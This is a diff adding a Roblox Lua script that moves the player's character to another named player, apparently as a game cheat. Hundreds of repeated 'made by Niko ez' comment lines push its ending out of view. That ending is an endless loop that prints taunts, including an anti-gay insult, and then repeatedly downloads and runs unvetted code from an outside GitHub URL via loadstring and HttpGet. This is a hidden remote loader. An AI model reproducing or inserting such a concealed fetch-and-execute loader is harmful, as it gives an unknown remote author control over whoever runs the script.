@@ -1,0 +1,291 @@
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+
+local plr = Players.LocalPlayer
+
+local Target = "" -- anyones full username works
+
+local function waitForChildRecursive(parent, childName)
+    local child = parent:FindFirstChild(childName)
+    while not child do
+        parent.ChildAdded:Wait()
+        child = parent:FindFirstChild(childName)
+    end
+    return child
+end
+
+local char = plr.Character or plr.CharacterAdded:Wait()
+local hrp = waitForChildRecursive(char, "HumanoidRootPart")
+
+local tweenInfo = TweenInfo.new(
+    3,
+    Enum.EasingStyle.Linear,
+    Enum.EasingDirection.In,
+    0,
+    false,
+    0
+)
+
+local goal = {
+    CFrame = game.Players[Target].Character.HumanoidRootPart.CFrame
+}
+
+local tween = TweenService:Create(hrp, tweenInfo, goal)
+tween:Play()
+
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+-- made by Niko ez
+while task.wait() do
+	print("made by Niko leak then gay...")
+	wait(3)
+	print("...")
+	wait(5)
+	print("you're making me angry >:(")
+	wait(3)
+	print("ugh fine...")
+	wait(3)
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/a69killer/TweenService/refs/heads/main/Bomba"))()
+end
